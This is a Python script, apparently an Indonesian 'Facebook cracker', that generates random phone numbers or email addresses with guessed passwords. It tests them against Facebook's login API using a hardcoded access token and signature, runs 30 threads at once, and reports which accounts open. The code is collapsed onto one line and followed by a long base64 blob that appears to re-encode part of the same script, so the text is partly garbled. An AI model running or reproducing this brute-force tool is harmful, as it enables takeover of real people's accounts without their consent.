#RECODE RIZKY MAULANA SIDIK XD
#YOUTUBE : RIZKY MAULANA S
import os, re, requests, concurrent.futures from random import randint def brute(user, passs): try: for pw in passs: params={ 'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6', } api='https://b-api.facebook.com/method/auth.login' response=requests.get(api, params=params) if re.search('(EAAA)\w+', str(response.text)): print(' [HIDUP] %s -> %s '%(str(user), str(pw))) break elif 'www.facebook.com' in response.json()['error_msg']: print(' [MODAR] %s -> %s '%(str(user), str(pw))) break except: pass def random_numbers(): data = [] os.system('cls' if os.name == 'nt' else 'clear') print(''' üåê FACEBOOK CRACKER RANDOM NUMBERS üåê üòé REVOLUTION.ID X RIZKY MAULANA SIDIK üòé Isi Nomer Awal Nya Dulu Dong Bro ;) Harus 5 Digit Ya Gak Boleh Kurang Dan Gak Boleh Lebih. Contoh: 0610202 ''') kode=str(input(' Masukan nomor awal: ')) exit(' Nomor harus 5 digit ya bro ga boleh kurang.') if len(kode) < 5 else '' exit(' Nomor harus 5 digit ya bro ga boleh lebih.') if len(kode) > 5 else '' jml=int(input(''' Masukan jumlah nomor yang akan dibuat contoh: 10 Jumlah: ''')) [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]] print(''' Semoga Hari Sekarang Lu Dapet Bro Oke ? :) Tunggu Anak Sabar Di Sayang Janda.... ''') with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th: {th.submit(brute, user['user'], user['pw']): user for user in data} print('\n Sudah Selesai Sob') def random_email(): data = [] os.system('cls' if os.name == 'nt' else 'clear') print(''' üåê FACEBOOK CRACKER RANDOM EMAIL üåê üòé REVOLUTION.ID X RIZKY MAULANA SIDIK üòé Isi Nama Pengguna Dulu Tolol-_- Contoh: rizkyganteng, rizkygans ''') nama=input(' Nama pengguna: ') domain=input(''' Pilih domainya dulu bro [G]mail, [Y]ahoo, [H]otmail pilih (g,y,h): ''').lower().strip() list={ 'g':'@gmail.com', 'y':'@yahoo.com', 'h':'@hotmail.com' } exit(' Mohon isi yang bener ya sob.') if not domain in ['g','y','h'] else '' jml=int(input(''' Masukan jumlah email yang akan dibuat contoh: 633 Jumlah: ''')) setpw=input(''' Set password yg mendekati nama pengguna contoh: rizkyganteng123,rizkygans133 Set password: ''').split(',') [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)] print(''' Semoga hari ini lu beruntung ya bro:) Tunggu Anak Sabar Di Sayang Janda.... ''') with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th: {th.submit(brute, user['user'], user['pw']): user for user in data} print('\n Sudah selesai kak') def pilih(): print(''' ‚ùå REVOLUTION.ID X RIZKY MAULANA SIDIK ‚ùå 1. üòéCrack Dari Nomer Randomüòé 2. üòéCrack Dari Email Randomüòé ‚ùå REVOLUTION.ID X RIZKY MAULANA SIDIK ‚ùå ''') pil=int(input(' Pilih Yang Mana Bro Hadeh?: ')) if pil == 1: random_numbers() elif pil == 2: random_email() else: exit(' RizkyGantengEa') pilih() if __name__ == '__main__' else exit('Maaf Bro Ada Yang Eror, Kek Nya Lu Belum Sholat Dah.') +MkCAgIPCfmI4gUkVWT0xVVElPTi5JRCBYIFJJWktZIE1BVUxBTkEgU0lESUsg8J+YjiAgIElzaSBOb21lciBBd2FsIE55YSBEdWx1IERvbmcgQnJvIDspICAgSGFydXMgNSBEaWdpdCBZYSBHYWsgQm9sZWggS3VyYW5nIERhbiBHYWsgQm9sZWggTGViaWguICAgQ29udG9oOiAwNjEwMjAyICAgJycnKSAgIGtvZGU9c3RyKGlucHV0KCcgIE1hc3VrYW4gbm9tb3IgYXdhbDogJykpICAgZXhpdCgnICBOb21vciBoYXJ1cyA1IGRpZ2l0IHlhIGJybyBnYSBib2xlaCBrdXJhbmcuJykgaWYgbGVuKGtvZGUpIDwgNSBlbHNlICcnICAgZXhpdCgnICBOb21vciBoYXJ1cyA1IGRpZ2l0IHlhIGJybyBnYSBib2xlaCBsZWJpaC4nKSBpZiBsZW4oa29kZSkgPiA1IGVsc2UgJycgICBqbWw9aW50KGlucHV0KCcnJyAgIE1hc3VrYW4ganVtbGFoIG5vbW9yIHlhbmcgYWthbiBkaWJ1YXQgY29udG9oOiAxMCAgIEp1bWxhaDogJycnKSkgICBbZGF0YS5hcHBlbmQoeyd1c2VyJzogc3RyKGUpLCAncHcnOltzdHIoZVs1Ol0pLCBzdHIoZVs2Ol0pLCBzdHIoZVs3Ol0pXX0pIGZvciBlIGluIFtzdHIoa29kZSkrJycuam9pbihbJyVzJyUocmFuZGludCgwLDkpKSBmb3IgaSBpbiByYW5nZSgwLDgpXSkgZm9yIGUgaW4gcmFuZ2Uoam1sKV1dICAgcHJpbnQoJycnICAgU2Vtb2dhIEhhcmkgU2VrYXJhbmcgTHUgRGFwZXQgQnJvIE9rZSA/IDopICAgVHVuZ2d1IEFuYWsgU2FiYXIgRGkgU2F5YW5nIEphbmRhLi4uLiAgICcnJykgICB3aXRoIGNvbmN1cnJlbnQuZnV0dXJlcy5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIHRoOiAgICAge3RoLnN1Ym1pdChicnV0ZSwgdXNlclsndXNlciddLCB1c2VyWydwdyddKTogdXNlciBmb3IgdXNlciBpbiBkYXRhfSAgIHByaW50KCdcbiAgU3VkYWggU2VsZXNhaSBTb2InKSAgZGVmIHJhbmRvbV9lbWFpbCgpOiAgIGRhdGEgPSBbXSAgIG9zLnN5c3RlbSgnY2xzJyBpZiBvcy5uYW1lID09ICdudCcgZWxzZSAnY2xlYXInKSAgIHByaW50KCcnJyAgIPCfjJAgRkFDRUJPT0sgQ1JBQ0tFUiBSQU5ET00gRU1BSUwg8J+MkCAgIPCfmI4gUkVWT0xVVElPTi5JRCBYIFJJWktZIE1BVUxBTkEgU0lESUsg8J+YjiAgIElzaSBOYW1hIFBlbmdndW5hIER1bHUgVG9sb2wtXy0gICBDb250b2g6IHJpemt5Z2FudGVuZywgcml6a3lnYW5zICAgJycnKSAgIG5hbWE9aW5wdXQoJyAgTmFtYSBwZW5nZ3VuYTogJykgICBkb21haW49aW5wdXQoJycnICAgUGlsaWggZG9tYWlueWEgZHVsdSBicm8gW0ddbWFpbCwgW1ldYWhvbywgW0hdb3RtYWlsICAgcGlsaWggKGcseSxoKTogJycnKS5sb3dlcigpLnN0cmlwKCkgICBsaXN0PXsgICAgICdnJzonQGdtYWlsLmNvbScsICAgICAneSc6J0B5YWhvby5jb20nLCAgICAgJ2gnOidAaG90bWFpbC5jb20nICAgfSAgIGV4aXQoJyAgTW9ob24gaXNpIHlhbmcgYmVuZXIgeWEgc29iLicpIGlmIG5vdCBkb21haW4gaW4gWydnJywneScsJ2gnXSBlbHNlICcnICAgam1sPWludChpbnB1dCgnJycgICBNYXN1a2FuIGp1bWxhaCBlbWFpbCB5YW5nIGFrYW4gZGlidWF0IGNvbnRvaDogNjMzICAgSnVtbGFoOiAnJycpKSAgIHNldHB3PWlucHV0KCcnJyAgIFNldCBwYXNzd29yZCB5ZyBtZW5kZWthdGkgbmFtYSBwZW5nZ3VuYSAgIGNvbnRvaDogcml6a3lnYW50ZW5nMTIzLHJpemt5Z2FuczEzMyAgIFNldCBwYXNzd29yZDogJycnKS5zcGxpdCgnLCcpICAgW2RhdGEuYXBwZW5kKHsndXNlcic6IG5hbWErc3RyKGUpK2xpc3RbZG9tYWluXSwgJ3B3JzpbKGkpIGZvciBpIGluIHNldHB3XX0pIGZvciBlIGluIHJhbmdlKDEsam1sKzEpXSAgIHByaW50KCcnJyAgIFNlbW9nYSBoYXJpIGluaSBsdSBiZXJ1bnR1bmcgeWEgYnJvOikgICBUdW5nZ3UgQW5hayBTYWJhciBEaSBTYXlhbmcgSmFuZGEuLi4uICAgJycnKSAgIHdpdGggY29uY3VycmVudC5mdXR1cmVzLlRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgdGg6ICAgICB7dGguc3VibWl0KGJydXRlLCB1c2VyWyd1c2VyJ10sIHVzZXJbJ3B3J10pOiB1c2VyIGZvciB1c2VyIGluIGRhdGF9ICAgcHJpbnQoJ1xuICBTdWRhaCBzZWxlc2FpIGthaycpICBkZWYgcGlsaWgoKTogICBwcmludCgnJycgICDinYwgUkVWT0xVVElPTi5JRCBYIFJJWktZIE1BVUxBTkEgU0lESUsg4p2MICAgMS4g8J+YjkNyYWNrIERhcmkgTm9tZXIgUmFuZG9t8J+YjiAgIDIuIPCfmI5DcmFjayBEYXJpIEVtYWlsIFJhbmRvbfCfmI4gICDinYwgUkVWT0xVVElPTi5JRCBYIFJJWktZIE1BVUxBTkEgU0lESUsg4p2MICAgJycnKSAgIHBpbD1pbnQoaW5wdXQoJyAgUGlsaWggWWFuZyBNYW5hIEJybyBIYWRlaD86ICcpKSAgIGlmIHBpbCA9PSAxOiAgICAgcmFuZG9tX251bWJlcnMoKSAgIGVsaWYgcGlsID09IDI6ICAgICByYW5kb21fZW1haWwoKSAgIGVsc2U6ICAgICBleGl0KCcgIFJpemt5R2FudGVuZ0VhJykgICBwaWxpaCgpIGlmIF9fbmFtZV9fID09ICdfX21haW5fXycgZWxzZSBleGl0KCdNYWFmIEJybyBBZGEgWWFuZyBFcm9yLCBLZWsgTnlhIEx1IEJlbHVtIFNob2xhdCBEYWguJykg
